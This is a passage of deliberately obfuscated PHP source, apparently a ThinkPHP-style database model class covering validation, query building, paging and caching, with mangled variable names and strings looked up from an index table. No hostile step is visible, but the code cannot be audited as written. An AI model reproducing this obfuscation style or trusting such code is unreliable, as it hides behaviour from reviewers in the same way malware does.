!$this->options[$òãº“´·[308]]) { return !0; } if (think_config($òãº“´·[305])) { $³öûäŸš = think_config($òãº“´·[306]); if (!isset($ë÷É³¨è[$³öûäŸš]) || Session::get($³öûäŸš)) { return !1; } list($²œ³½ª“, $‰Æö‰÷Ş) = explode($òãº“´·[81], $ë÷É³¨è[$³öûäŸš]); if ($‰Æö‰÷Ş && Session::get($³öûäŸš . $òãº“´·[105] . $²œ³½ª“) === $‰Æö‰÷Ş) { Session::remove($³öûäŸš . $òãº“´·[105] . $²œ³½ª“); return !0; } if (think_config($òãº“´·[309])) { Session::remove($³öûäŸš . $òãº“´·[105] . $²œ³½ª“); } return !1; } return !0; } public function regex($µ£éø‡ú, $ÑàÀŠš¸) { $ü¬â™äé =& $_SERVER[Á÷ ­Šë]; $ ÍØÀóÈ = array($ü¬â™äé[310] => $ü¬â™äé[311], $ü¬â™äé[312] => $ü¬â™äé[313], $ü¬â™äé[314] => $ü¬â™äé[315], $ü¬â™äé[316] => $ü¬â™äé[317], $ü¬â™äé[318] => $ü¬â™äé[319], $ü¬â™äé[320] => $ü¬â™äé[321], $ü¬â™äé[322] => $ü¬â™äé[323], $ü¬â™äé[297] => $ü¬â™äé[324], $ü¬â™äé[325] => $ü¬â™äé[326]); if (isset($ ÍØÀóÈ[strtolower($ÑàÀŠš¸)])) { $ÑàÀŠš¸ = $ ÍØÀóÈ[strtolower($ÑàÀŠš¸)]; } return preg_match($ÑàÀŠš¸, $µ£éø‡ú) === 1; } private function autoOperation(&$µıß¿ˆ, $…òûª¸Ñ) { $úÓÜ×µñ =& $_SERVER[Á÷ ­Šë]; if (!empty($this->options[$úÓÜ×µñ[327]])) { $ãí ßç© = $this->options[$úÓÜ×µñ[327]]; unset($this->options[$úÓÜ×µñ[327]]); } elseif (!empty($this->_auto)) { $ãí ßç© = $this->_auto; } if (isset($ãí ßç©)) { foreach ($ãí ßç© as $¬ˆ²…¸Î) { if (empty($¬ˆ²…¸Î[2])) { $¬ˆ²…¸Î[2] = THINK_MODEL_INSERT; } if ($…òûª¸Ñ == $¬ˆ²…¸Î[2] || $¬ˆ²…¸Î[2] == THINK_MODEL_BOTH) { switch (trim($¬ˆ²…¸Î[3])) { case $úÓÜ×µñ[328]: case $úÓÜ×µñ[329]: $¤ëñÂ‰¢ = isset($¬ˆ²…¸Î[4]) ? (array) $¬ˆ²…¸Î[4] : array(); if (isset($µıß¿ˆ[$¬ˆ²…¸Î[0]])) { array_unshift($¤ëñÂ‰¢, $µıß¿ˆ[$¬ˆ²…¸Î[0]]); } if ($úÓÜ×µñ[328] == $¬ˆ²…¸Î[3]) { $µıß¿ˆ[$¬ˆ²…¸Î[0]] = call_user_func_array($¬ˆ²…¸Î[1], $¤ëñÂ‰¢); } else { $µıß¿ˆ[$¬ˆ²…¸Î[0]] = call_user_func_array(array(&$this, $¬ˆ²…¸Î[1]), $¤ëñÂ‰¢); } break; case $úÓÜ×µñ[280]: $µıß¿ˆ[$¬ˆ²…¸Î[0]] = $µıß¿ˆ[$¬ˆ²…¸Î[1]]; break; case $úÓÜ×µñ[330]: if ($úÓÜ×µñ[33] === $µıß¿ˆ[$¬ˆ²…¸Î[0]]) { unset($µıß¿ˆ[$¬ˆ²…¸Î[0]]); } break; case $úÓÜ×µñ[331]: default: $µıß¿ˆ[$¬ˆ²…¸Î[0]] = $¬ˆ²…¸Î[1]; } if (!1 === $µıß¿ˆ[$¬ˆ²…¸Î[0]]) { unset($µıß¿ˆ[$¬ˆ²…¸Î[0]]); } } } } return $µıß¿ˆ; } protected function autoValidation($ŸºØé’İ, $’»Ãúíï) { $ö„Ä˜à¯ =& $_SERVER[Á÷ ­Šë]; if (!empty($this->options[$ö„Ä˜à¯[332]])) { $¦‘ÒÌ‚† = $this->options[$ö„Ä˜à¯[332]]; unset($this->options[$ö„Ä˜à¯[332]]); } elseif (!empty($this->_validate)) { $¦‘ÒÌ‚† = $this->_validate; } if (isset($¦‘ÒÌ‚†)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¦‘ÒÌ‚† as $ÖÇƒòÏ¥ => $Ôî¸§¬Ø) { if (empty($Ôî¸§¬Ø[5]) || $Ôî¸§¬Ø[5] == THINK_MODEL_BOTH || $Ôî¸§¬Ø[5] == $’»Ãúíï) { if (0 == strpos($Ôî¸§¬Ø[2], $ö„Ä˜à¯[333]) && strpos($Ôî¸§¬Ø[2], $ö„Ä˜à¯[334])) { $Ôî¸§¬Ø[2] = think_lang(substr($Ôî¸§¬Ø[2], 2, -1)); } $Ôî¸§¬Ø[3] = isset($Ôî¸§¬Ø[3]) ? $Ôî¸§¬Ø[3] : THINK_EXISTS_VALIDATE; $Ôî¸§¬Ø[4] = isset($Ôî¸§¬Ø[4]) ? $Ôî¸§¬Ø[4] : $ö„Ä˜à¯[335]; switch ($Ôî¸§¬Ø[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ŸºØé’İ, $Ôî¸§¬Ø)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ö„Ä˜à¯[33] != trim($ŸºØé’İ[$Ôî¸§¬Ø[0]])) { if (!1 === $this->_validationField($ŸºØé’İ, $Ôî¸§¬Ø)) { return !1; } } break; default: if (isset($ŸºØé’İ[$Ôî¸§¬Ø[0]])) { if (!1 === $this->_validationField($ŸºØé’İ, $Ôî¸§¬Ø)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ç¤µµ¬, $€Ø¸’¡) { if (!1 === $this->_validationFieldItem($ç¤µµ¬, $€Ø¸’¡)) { if ($this->patchValidate) { $this->error[$€Ø¸’¡[0]] = $€Ø¸’¡[2]; } else { $this->error = $€Ø¸’¡[2]; return !1; } } return; } protected function _validationFieldItem($¥µ´÷å, $Ğ¬«Ÿñå) { $ñ€ŒÏâì =& $_SERVER[Á÷ ­Šë]; switch (strtolower(trim($Ğ¬«Ÿñå[4]))) { case $ñ€ŒÏâì[328]: case $ñ€ŒÏâì[329]: $‘ Ê•û = isset($Ğ¬«Ÿñå[6]) ? (array) $Ğ¬«Ÿñå[6] : array(); if (is_string($Ğ¬«Ÿñå[0]) && strpos($Ğ¬«Ÿñå[0], $ñ€ŒÏâì[47])) { $Ğ¬«Ÿñå[0] = explode($ñ€ŒÏâì[47], $Ğ¬«Ÿñå[0]); } if (is_array($Ğ¬«Ÿñå[0])) { foreach ($Ğ¬«Ÿñå[0] as $ñÅîÆ¼Ü) { $ìÏ¢¬¡§[$ñÅîÆ¼Ü] = $¥µ´÷å[$ñÅîÆ¼Ü]; } array_unshift($‘ Ê•û, $ìÏ¢¬¡§); } else { array_unshift($‘ Ê•û, $¥µ´÷å[$Ğ¬«Ÿñå[0]]); } if ($ñ€ŒÏâì[328] == $Ğ¬«Ÿñå[4]) { return call_user_func_array($Ğ¬«Ÿñå[1], $‘ Ê•û); } else { return call_user_func_array(array(&$this, $Ğ¬«Ÿñå[1]), $‘ Ê•û); } case $ñ€ŒÏâì[336]: return $¥µ´÷å[$Ğ¬«Ÿñå[0]] == $¥µ´÷å[$Ğ¬«Ÿñå[1]]; case $ñ€ŒÏâì[337]: if (is_string($Ğ¬«Ÿñå[0]) && strpos($Ğ¬«Ÿñå[0], $ñ€ŒÏâì[47])) { $Ğ¬«Ÿñå[0] = explode($ñ€ŒÏâì[47], $Ğ¬«Ÿñå[0]); } $Òøİ ‹š = array(); if (is_array($Ğ¬«Ÿñå[0])) { foreach ($Ğ¬«Ÿñå[0] as $ñÅîÆ¼Ü) { $Òøİ ‹š[$ñÅîÆ¼Ü] = $¥µ´÷å[$ñÅîÆ¼Ü]; } } else { $Òøİ ‹š[$Ğ¬«Ÿñå[0]] = $¥µ´÷å[$Ğ¬«Ÿñå[0]]; } if (!empty($¥µ´÷å[$this->getPk()])) { $Òøİ ‹š[$this->getPk()] = array($ñ€ŒÏâì[338], $¥µ´÷å[$this->getPk()]); } if ($this->where($Òøİ ‹š)->find()) { return !1; } return !0; default: return $this->check($¥µ´÷å[$Ğ¬«Ÿñå[0]], $Ğ¬«Ÿñå[1], $Ğ¬«Ÿñå[4]); } } public function check($ÍÇá•õ°, $‹•áÈŠ, $«š¦úÇ¨ = "\x72\x65\x67\145\x78") { $Çë‰İÏ¸ =& $_SERVER[Á÷ ­Šë]; $«š¦úÇ¨ = strtolower(trim($«š¦úÇ¨)); switch ($«š¦úÇ¨) { case $Çë‰İÏ¸[7]: case $Çë‰İÏ¸[339]: $²¥ÄğÚØ = is_array($‹•áÈŠ) ? $‹•áÈŠ : explode($Çë‰İÏ¸[47], $‹•áÈŠ); return $«š¦úÇ¨ == $Çë‰İÏ¸[7] ? in_array($ÍÇá•õ°, $²¥ÄğÚØ) : !in_array($ÍÇá•õ°, $²¥ÄğÚØ); case $Çë‰İÏ¸[340]: case $Çë‰İÏ¸[341]: if (is_array($‹•áÈŠ)) { $ÙºöÔĞ = $‹•áÈŠ[0]; $Ô“ÕÛÎÎ = $‹•áÈŠ[1]; } else { list($ÙºöÔĞ, $Ô“ÕÛÎÎ) = explode($Çë‰İÏ¸[47], $‹•áÈŠ); } return $«š¦úÇ¨ == $Çë‰İÏ¸[340] ? $ÍÇá•õ° >= $ÙºöÔĞ && $ÍÇá•õ° <= $Ô“ÕÛÎÎ : $ÍÇá•õ° < $ÙºöÔĞ || $ÍÇá•õ° > $Ô“ÕÛÎÎ; case $Çë‰İÏ¸[342]: case $Çë‰İÏ¸[343]: return $«š¦úÇ¨ == $Çë‰İÏ¸[342] ? $ÍÇá•õ° == $‹•áÈŠ : $ÍÇá•õ° != $‹•áÈŠ; case $Çë‰İÏ¸[344]: $ŠÎ¾¨Óã = mb_strlen($ÍÇá•õ°, $Çë‰İÏ¸[345]); if (strpos($‹•áÈŠ, $Çë‰İÏ¸[47])) { list($ÙºöÔĞ, $Ô“ÕÛÎÎ) = explode($Çë‰İÏ¸[47], $‹•áÈŠ); return $ŠÎ¾¨Óã >= $ÙºöÔĞ && $ŠÎ¾¨Óã <= $Ô“ÕÛÎÎ; } else { return $ŠÎ¾¨Óã == $‹•áÈŠ; } case $Çë‰İÏ¸[346]: list($ú”–êŠ§, $ˆÎá‚°) = explode($Çë‰İÏ¸[47], $‹•áÈŠ); if (!is_numeric($ú”–êŠ§)) { $ú”–êŠ§ = strtotime($ú”–êŠ§); } if (!is_numeric($ˆÎá‚°)) { $ˆÎá‚° = strtotime($ˆÎá‚°); } return NOW_TIME >= $ú”–êŠ§ && NOW_TIME <= $ˆÎá‚°; case $Çë‰İÏ¸[347]: return in_array(get_client_ip(), explode($Çë‰İÏ¸[47], $‹•áÈŠ)); case $Çë‰İÏ¸[348]: return !in_array(get_client_ip(), explode($Çë‰İÏ¸[47], $‹•áÈŠ)); case $Çë‰İÏ¸[335]: default: return $this->regex($ÍÇá•õ°, $‹•áÈŠ); } } public function query($šˆ…”“, $Æäˆ‹”€ = false) { $Ï£îøŸ² =& $_SERVER[Á÷ ­Šë]; if (!is_bool($Æäˆ‹”€) && !is_array($Æäˆ‹”€)) { $Æäˆ‹”€ = func_get_args(); array_shift($Æäˆ‹”€); } $šˆ…”“ = str_replace(array($Ï£îøŸ²[62], $Ï£îøŸ²[349]), $Ï£îøŸ²[50], $šˆ…”“); $šˆ…”“ = $this->parseSql($šˆ…”“, $Æäˆ‹”€); return $this->db->query($šˆ…”“); } public function execute($´öŞòöĞ, $ÈôŠ„Ã÷ = false) { if (!is_bool($ÈôŠ„Ã÷) && !is_array($ÈôŠ„Ã÷)) { $ÈôŠ„Ã÷ = func_get_args(); array_shift($ÈôŠ„Ã÷); } $´öŞòöĞ = $this->parseSql($´öŞòöĞ, $ÈôŠ„Ã÷); return $this->db->execute($´öŞòöĞ); } protected function parseSql($›àğÅäø, $¢¢ÊßúĞ) { $°‚˜»Œ =& $_SERVER[Á÷ ­Šë]; if (!0 === $¢¢ÊßúĞ) { $§Á•Ñèî = $this->_parseOptions(); $›àğÅäø = $this->db->parseSql($›àğÅäø, $§Á•Ñèî); } elseif (is_array($¢¢ÊßúĞ)) { $¢¢ÊßúĞ = array_map(array($this->db, $°‚˜»Œ[350]), $¢¢ÊßúĞ); $›àğÅäø = vsprintf($›àğÅäø, $¢¢ÊßúĞ); } else { $›àğÅäø = strtr($›àğÅäø, array($°‚˜»Œ[351] => $this->getTableName(), $°‚˜»Œ[352] => think_config($°‚˜»Œ[251]))); } $this->db->setModel($this->name); return $›àğÅäø; } public function db($ÊïñøîÂ = '', $Ç…âËŞ = '', $óÕ¢‡ü = array()) { $Äı˜è¹ =& $_SERVER[Á÷ ­Šë]; if ($Äı˜è¹[33] === $ÊïñøîÂ && $this->db) { return $this->db; } static $‰¸×Ç«Å = array(); static $ìüÆã²õ = array(); if (!isset($ìüÆã²õ[$ÊïñøîÂ]) || isset($ìüÆã²õ[$ÊïñøîÂ]) && $Ç…âËŞ && $‰¸×Ç«Å[$ÊïñøîÂ] != $Ç…âËŞ) { if (!empty($Ç…âËŞ) && is_string($Ç…âËŞ) && !1 === strpos($Ç…âËŞ, $Äı˜è¹[8])) { $Ç…âËŞ = think_config($Ç…âËŞ); } $ÊïñøîÂ = think_guid($Ç…âËŞ); $ìüÆã²õ[$ÊïñøîÂ] = Db::getInstance($Ç…âËŞ); } elseif (NULL === $Ç…âËŞ) { $ìüÆã²õ[$ÊïñøîÂ]->close(); unset($ìüÆã²õ[$ÊïñøîÂ]); return; } if (!empty($óÕ¢‡ü)) { if (is_string($óÕ¢‡ü)) { parse_str($óÕ¢‡ü, $óÕ¢‡ü); } foreach ($óÕ¢‡ü as $ò›ëÌ¥ => $İêË»Ñ²) { $this->setProperty($ò›ëÌ¥, $İêË»Ñ²); } } $‰¸×Ç«Å[$ÊïñøîÂ] = $Ç…âËŞ; $this->db = $ìüÆã²õ[$ÊïñøîÂ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ˆ…¥¾íÚ = get_class($this); if ($ˆ…¥¾íÚ == $_SERVER[Á÷ ­Šë][353]) { return $this->name; } $this->name = substr($ˆ…¥¾íÚ, 0, -5); } return $this->name; } public function getTableName() { $¸Ë„¶™Æ =& $_SERVER[Á÷ ­Šë]; if (empty($this->trueTableName)) { $ôŸòéšÖ = !empty($this->tablePrefix) ? $this->tablePrefix : $¸Ë„¶™Æ[33]; if (!empty($this->tableName)) { $ôŸòéšÖ .= $this->tableName; } else { $ôŸòéšÖ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ôŸòéšÖ); } return (!empty($this->dbName) ? $this->dbName . $¸Ë„¶™Æ[105] : $¸Ë„¶™Æ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ó±ÊõÎ¹ =& $_SERVER[Á÷ ­Šë]; return isset($this->fields[$ó±ÊõÎ¹[258]]) ? $this->fields[$ó±ÊõÎ¹[258]] : $this->pk; } public function getDbFields() { $‡íúÇÀĞ =& $_SERVER[Á÷ ­Šë]; if (isset($this->options[$‡íúÇÀĞ[286]])) { $ü›ùåôÉ = $this->db->getFields($this->options[$‡íúÇÀĞ[286]]); return $ü›ùåôÉ ? array_keys($ü›ùåôÉ) : !1; } if ($this->fields) { $ü›ùåôÉ = $this->fields; unset($ü›ùåôÉ[$‡íúÇÀĞ[257]], $ü›ùåôÉ[$‡íúÇÀĞ[258]], $ü›ùåôÉ[$‡íúÇÀĞ[259]], $ü›ùåôÉ[$‡íúÇÀĞ[256]]); return $ü›ùåôÉ; } return !1; } public function data($Ä¾Ø§‚ = '') { $Ô‚ÉÅñ¬ =& $_SERVER[Á÷ ­Šë]; if ($Ô‚ÉÅñ¬[33] === $Ä¾Ø§‚ && !empty($this->data)) { return $this->data; } if (is_object($Ä¾Ø§‚)) { $Ä¾Ø§‚ = get_object_vars($Ä¾Ø§‚); } elseif (is_string($Ä¾Ø§‚)) { parse_str($Ä¾Ø§‚, $Ä¾Ø§‚); } elseif (!is_array($Ä¾Ø§‚)) { think_exception(think_lang($Ô‚ÉÅñ¬[278])); } $this->data = $Ä¾Ø§‚; return $this; } public function join($ÀÑËÉ–) { $¦°†›Ä =& $_SERVER[Á÷ ­Šë]; if (is_array($ÀÑËÉ–)) { $this->options[$¦°†›Ä[289]] = $ÀÑËÉ–; } elseif (!empty($ÀÑËÉ–)) { $this->options[$¦°†›Ä[289]][] = $ÀÑËÉ–; } return $this; } public function union($åÏ£ú˜, $ÕÒÔ¾­¤ = false) { $¢óÊ£î• =& $_SERVER[Á÷ ­Šë]; if (empty($åÏ£ú˜)) { return $this; } if ($ÕÒÔ¾­¤) { $this->options[$¢óÊ£î•[354]][$¢óÊ£î•[355]] = !0; } if (is_object($åÏ£ú˜)) { $åÏ£ú˜ = get_object_vars($åÏ£ú˜); } if (is_string($åÏ£ú˜)) { $ ²Îš±— = $åÏ£ú˜; } elseif (is_array($åÏ£ú˜)) { if (isset($åÏ£ú˜[0])) { $this->options[$¢óÊ£î•[354]] = array_merge($this->options[$¢óÊ£î•[354]], $åÏ£ú˜); return $this; } else { $ ²Îš±— = $åÏ£ú˜; } } else { think_exception(think_lang($¢óÊ£î•[278])); } $this->options[$¢óÊ£î•[354]][] = $ ²Îš±—; return $this; } public function cache($ÉÚÔ‹º© = true, $­Æ—ˆ¡è = null, $§´‡æÇâ = '') { $Îë¢Šùî =& $_SERVER[Á÷ ­Šë]; if (!1 !== $ÉÚÔ‹º©) { $this->options[$Îë¢Šùî[356]] = array($Îë¢Šùî[103] => $ÉÚÔ‹º©, $Îë¢Šùî[346] => $­Æ—ˆ¡è, $Îë¢Šùî[29] => $§´‡æÇâ); } return $this; } public function field($´„£èà, $ôçÜ®ù  = false) { $¤ ›÷ä =& $_SERVER[Á÷ ­Šë]; if (!0 === $´„£èà) { $”â²²­ = $this->getDbFields(); $´„£èà = $”â²²­ ? $”â²²­ : $¤ ›÷ä[192]; } elseif ($ôçÜ®ù ) { if (is_string($´„£èà)) { $´„£èà = explode($¤ ›÷ä[47], $´„£èà); } $”â²²­ = $this->getDbFields(); $´„£èà = $”â²²­ ? array_diff($”â²²­, $´„£èà) : $´„£èà; } $this->options[$¤ ›÷ä[280]] = $´„£èà; return $this; } public function scope($ùÕƒ¦ì = '', $¨‰Òşğé = NULL) { $ÑŸê“œ› =& $_SERVER[Á÷ ­Šë]; if ($ÑŸê“œ›[33] === $ùÕƒ¦ì) { if (isset($this->_scope[$ÑŸê“œ›[34]])) { $—Ä·³ = $this->_scope[$ÑŸê“œ›[34]]; } else { return $this; } } elseif (is_string($ùÕƒ¦ì)) { $¼›óóã¸ = explode($ÑŸê“œ›[47], $ùÕƒ¦ì); $—Ä·³ = array(); foreach ($¼›óóã¸ as $¾Ş£îÙ) { if (!isset($this->_scope[$¾Ş£îÙ])) { continue; } $—Ä·³ = array_merge($—Ä·³, $this->_scope[$¾Ş£îÙ]); } if (!empty($¨‰Òşğé) && is_array($¨‰Òşğé)) { $—Ä·³ = array_merge($—Ä·³, $¨‰Òşğé); } } elseif (is_array($ùÕƒ¦ì)) { $—Ä·³ = $ùÕƒ¦ì; } if (is_array($—Ä·³) && !empty($—Ä·³)) { $this->options = array_merge($this->options, array_change_key_case($—Ä·³)); } return $this; } public function where($ºŸ•÷”, $œÎ²ıÛı = null) { $Ô…Ä‡Ñö =& $_SERVER[Á÷ ­Šë]; if (!is_null($œÎ²ıÛı) && is_string($ºŸ•÷”)) { if (!is_array($œÎ²ıÛı)) { $œÎ²ıÛı = func_get_args(); array_shift($œÎ²ıÛı); } $œÎ²ıÛı = array_map(array($this->db, $Ô…Ä‡Ñö[350]), $œÎ²ıÛı); $ºŸ•÷” = vsprintf($ºŸ•÷”, $œÎ²ıÛı); } elseif (is_object($ºŸ•÷”)) { $ºŸ•÷” = get_object_vars($ºŸ•÷”); } elseif (is_array($ºŸ•÷”)) { foreach ($ºŸ•÷” as $İ»»Ï => $×Ş¶“ı·) { if ((is_numeric($İ»»Ï) || !$İ»»Ï) && is_string($×Ş¶“ı·)) { if (strpos($×Ş¶“ı·, $Ô…Ä‡Ñö[357]) === 0) { continue; } think_trace($Ô…Ä‡Ñö[358], $Ô…Ä‡Ñö[33], $Ô…Ä‡Ñö[46]); die; } } } if (is_string($ºŸ•÷”) && $Ô…Ä‡Ñö[33] != $ºŸ•÷”) { $İ°ÈêÄ… = array(); $İ°ÈêÄ…[$Ô…Ä‡Ñö[359]] = $ºŸ•÷”; $ºŸ•÷” = $İ°ÈêÄ…; } if (isset($this->options[$Ô…Ä‡Ñö[282]])) { $this->options[$Ô…Ä‡Ñö[282]] = array_merge($this->options[$Ô…Ä‡Ñö[282]], $ºŸ•÷”); } else { $this->options[$Ô…Ä‡Ñö[282]] = $ºŸ•÷”; } return $this; } public function limit($ÕæÁ÷Ş, $ÀÎö”Âµ = null) { $“Šàßä =& $_SERVER[Á÷ ­Šë]; $this->options[$“Šàßä[299]] = is_null($ÀÎö”Âµ) ? $ÕæÁ÷Ş : $ÕæÁ÷Ş . $“Šàßä[47] . $ÀÎö”Âµ; return $this; } public function page($Æßœ®÷Õ, $½¨ğÖû« = null) { $÷Ï§ª¦ï =& $_SERVER[Á÷ ­Šë]; $this->options[$÷Ï§ª¦ï[360]] = is_null($½¨ğÖû«) ? $Æßœ®÷Õ : $Æßœ®÷Õ . $÷Ï§ª¦ï[47] . $½¨ğÖû«; return $this; } public function comment($úÁªçõ§) { $this->options[$_SERVER[Á÷ ­Šë][361]] = $úÁªçõ§; return $this; } public function setProperty($‡¥¹˜‡ç, $ê¯ïâãª) { if (property_exists($this, $‡¥¹˜‡ç)) { $this->{$‡¥¹˜‡ç} = $ê¯ïâãª; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\155\x65", "\x74\151\x6d\145", "\151\156\x73\x65\x72\164\54\165\160\x64\141\x74\x65", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x63\x72\x65\x61\164\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\x66\165\156\x63\164\151\x6f\x6e")); public function setDataAuto($Óè§ü‚‘) { $this->dataAuto = $Óè§ü‚‘; } public function __construct($ò…™›·† = '', $¯î­ƒ„ = '', $ü½ñ ª” = '') { parent::__construct($ò…™›·†, $¯î­ƒ„, $ü½ñ ª”); } protected $tableMeta = array(); protected function _beforeInsert(&$«Úìş–, $Å‹ÒûºÕ) { $ÑıèïÈÒ =& $_SERVER[Á÷ ­Šë]; if (!$this->checkDataAutoHas($ÑıèïÈÒ[362])) { return; } $this->dataBeforeFilter($«Úìş–, $ÑıèïÈÒ[362]); } protected function _beforeUpdate(&$í¡Š§ùË, $ºôƒ†ä) { $™é€„º¡ =& $_SERVER[Á÷ ­Šë]; if (!$this->checkDataAutoHas($™é€„º¡[363])) { return; } $this->dataBeforeFilter($í¡Š§ùË, $™é€„º¡[363]); } protected function _afterSelect(&$êï¼¸Ä, $ò–ÎìÌÓ) { if (!is_array($êï¼¸Ä)) { return; } if (!$this->checkDataAutoHas($_SERVER[Á÷ ­Šë][364])) { return; } foreach ($êï¼¸Ä as &$Ö¨ƒéã¤) { $this->dataAfterFilter($Ö¨ƒéã¤); } unset($Ö¨ƒéã¤); } protected function _afterFind(&$ŸØúªÜË, $»óúûãÑ) { if (!is_array($ŸØúªÜË)) { return; } if (!$this->checkDataAutoHas($_SERVER[Á÷ ­Šë][364])) { return; } $this->dataAfterFilter($ŸØúªÜË); } public static function textEncode($©†ôû‹ƒ) { if (!$©†ôû‹ƒ) { return $©†ôû‹ƒ; } $ÚÎ’ÓÙ = json_encode($©†ôû‹ƒ); $ÚÎ’ÓÙ = preg_replace_callback($_SERVER[Á÷ ­Šë][365], function ($°¨à—¶) { return addslashes($°¨à—¶[0]); }, $ÚÎ’ÓÙ); return json_decode($ÚÎ’ÓÙ); } public static function textDecode($™½ôó¡ç) { $‚Æö­»Û =& $_SERVER[Á÷ ­Šë]; $È£»şß = json_encode($™½ôó¡ç); $È£»şß = preg_replace_callback($‚Æö­»Û[366], function ($Òİ»øÊî) { return $_SERVER[Á÷ ­Šë][107]; }, $È£»şß); return json_decode($È£»şß); } public function setAutoIncrement($Ù¦¢œıœ) { $ó½“•€º = array($this->getPk() => $Ù¦¢œıœ); $ØÜ£õ©Î = $this->data($ó½“•€º)->add(); if ($ØÜ£õ©Î) { $this->delete($ØÜ£õ©Î); } } public function getAutoIncrement() { $¹¥£Âˆ = $this->getTableName(); $³Ñ¨ØŸğ = $this->max($this->getPk()); $Á”çšò­ = $this->query("\163\150\x6f\167\40\x74\x61\x62\x6c\145\x20\163\164\141\x74\x75\163\40\x77\x68\x65\162\145\40\x4e\141\x6d\x65\x3d\47{$¹¥£Âˆ}\47"); $Ù¯¨×‰© = $Á”çšò­[0][$_SERVER[Á÷ ­Šë][367]]; $Ò€Ëéß« = max($³Ñ¨ØŸğ, $Ù¯¨×‰©); return $Ò€Ëéß«; } protected function _callBefore($¾Ò‚“‰ñ, $‘¥Êäîş) { return $this->cacheCallCheck($¾Ò‚“‰ñ, $‘¥Êäîş, !1); } protected function _callAfter($½˜´Å€², $—±»èÕÙ) { return $this->cacheCallCheck($½˜´Å€², $—±»èÕÙ, !0); } protected function cacheFunctionAlias($¤šµØÙê) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($™‰ğ“ë€, $’õàşäˆ, $Í€òŠà„ = false) { $òşÇ¯íê = $this->cacheFunctionAlias($’õàşäˆ); if (!$òşÇ¯íê) { return; } foreach ($òşÇ¯íê as $ÛÀôó” => $æú´ÖÍã) { $–Ä¥á³Ô = $æú´ÖÍã[0]; $ØÇ–î× = explode($_SERVER[Á÷ ­Šë][47], $æú´ÖÍã[1]); if ($™‰ğ“ë€ == $ÛÀôó”) { return $this->cacheFunctionGet($ÛÀôó”, $–Ä¥á³Ô); } if ($Í€òŠà„ && in_array($™‰ğ“ë€, $ØÇ–î×)) { $this->cacheFunctionClear($ÛÀôó”, $–Ä¥á³Ô); } } } public function cacheFunctionGet($Ø×Úá³, $çŸ÷ŸÕÜ) { $¶ë™ = $this->cacheKeyMake($Ø×Úá³, $çŸ÷ŸÕÜ); $Ÿ²÷‘÷Ï = Cache::get($¶ë™); if (!is_array($Ÿ²÷‘÷Ï)) { $Ÿ²÷‘÷Ï = call_user_func_array(array($this, $Ø×Úá³), array($çŸ÷ŸÕÜ, !0)); Cache::set($¶ë™, $Ÿ²÷‘÷Ï); } return $Ÿ²÷‘÷Ï; } public function cacheFunctionClear($¬ˆ›”, $™¼¿İµ¯) { $ø™‹¹ñ² = $™¼¿İµ¯; if (!is_array($™¼¿İµ¯)) { $ø™‹¹ñ² = array($™¼¿İµ¯); } foreach ($ø™‹¹ñ² as $ïØ¾•²) { $¤İ¯æØ = $this->cacheKeyMake($¬ˆ›”, $ïØ¾•²); Cache::remove($¤İ¯æØ); } } private function cacheKeyMake($«Ã×œ¯€, $£Ñ´€Ï) { $ÆÎĞËĞƒ =& $_SERVER[Á÷ ­Šë]; return get_class($this) . $ÆÎĞËĞƒ[81] . $«Ã×œ¯€ . $ÆÎĞËĞƒ[368] . $£Ñ´€Ï; } protected function selectPageReset() { $şé‹¡ªÌ =& $_SERVER[Á÷ ­Šë]; if (isset($GLOBALS[$şé‹¡ªÌ[369]])) { return; } $GLOBALS[$şé‹¡ªÌ[369]] = isset($GLOBALS[$şé‹¡ªÌ[7]][$şé‹¡ªÌ[370]]) ? $GLOBALS[$şé‹¡ªÌ[7]][$şé‹¡ªÌ[370]] : !1; $GLOBALS[$şé‹¡ªÌ[371]] = isset($GLOBALS[$şé‹¡ªÌ[7]][$şé‹¡ªÌ[360]]) ? $GLOBALS[$şé‹¡ªÌ[7]][$şé‹¡ªÌ[360]] : !1; $GLOBALS[$şé‹¡ªÌ[7]][$şé‹¡ªÌ[370]] = !1; $GLOBALS[$şé‹¡ªÌ[7]][$şé‹¡ªÌ[360]] = !1; } protected function selectPageRestore() { $ÓÊ«ç†Ø =& $_SERVER[Á÷ ­Šë]; if (!isset($GLOBALS[$ÓÊ«ç†Ø[369]])) { return; } $GLOBALS[$ÓÊ«ç†Ø[7]][$ÓÊ«ç†Ø[370]] = $GLOBALS[$ÓÊ«ç†Ø[369]]; $GLOBALS[$ÓÊ«ç†Ø[7]][$ÓÊ«ç†Ø[360]] = $GLOBALS[$ÓÊ«ç†Ø[371]]; if ($GLOBALS[$ÓÊ«ç†Ø[7]][$ÓÊ«ç†Ø[370]] === !1) { unset($GLOBALS[$ÓÊ«ç†Ø[7]][$ÓÊ«ç†Ø[370]]); } if ($GLOBALS[$ÓÊ«ç†Ø[7]][$ÓÊ«ç†Ø[360]] === !1) { unset($GLOBALS[$ÓÊ«ç†Ø[7]][$ÓÊ«ç†Ø[360]]); } unset($GLOBALS[$ÓÊ«ç†Ø[369]]); unset($GLOBALS[$ÓÊ«ç†Ø[371]]); } protected function selectPage($º¯ü¾ñ = 200, $ôú‚åİÑ = 1) { $˜ÓÀ‰×ª =& $_SERVER[Á÷ ­Šë]; global $in; $šÁÃáñ = $this->optionsValue(); $Ÿã³Ì“² = 50000; $º¯ü¾ñ = isset($in[$˜ÓÀ‰×ª[370]]) && $in[$˜ÓÀ‰×ª[370]] ? $in[$˜ÓÀ‰×ª[370]] : $º¯ü¾ñ; if 